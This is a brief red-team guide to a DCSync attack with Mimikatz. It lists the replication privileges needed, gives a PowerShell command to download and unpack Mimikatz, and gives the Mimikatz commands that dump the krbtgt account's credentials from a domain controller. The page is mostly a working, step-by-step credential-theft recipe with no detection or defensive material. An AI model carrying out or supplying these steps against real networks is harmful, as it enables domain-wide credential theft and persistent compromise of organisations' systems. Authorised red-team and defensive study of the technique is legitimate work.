# Red Team - Performing DCSync Attack with Mimikatz

**Tool:** Mimikatz  
**Technique:** DCSync  
**MITRE ATT&CK ID:** T1003.006  
**Tactic:** Credential Access

---

## Requirements

- Valid domain user credentials with **replication privileges**
    - Domain Admin
    - Enterprise Admin
    - Or any user with `Replicating Directory Changes` & `Replicating Directory Changes All` permissions

---

## Step-by-Step Instructions

### 1. Download Mimikatz

**On Windows:**
```powershell
Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip" -OutFile "mimikatz.zip"
Expand-Archive .\mimikatz.zip -DestinationPath .\mimikatz
cd .\mimikatz\x64
````
#### Open an elevated command prompt or PowerShell:
````powershell
.\mimikatz.exe
````

#### In the Mimikatz shell:
````powershell
privilege::debug
lsadump::dcsync /domain:mydomain.local /user:krbtgt
````
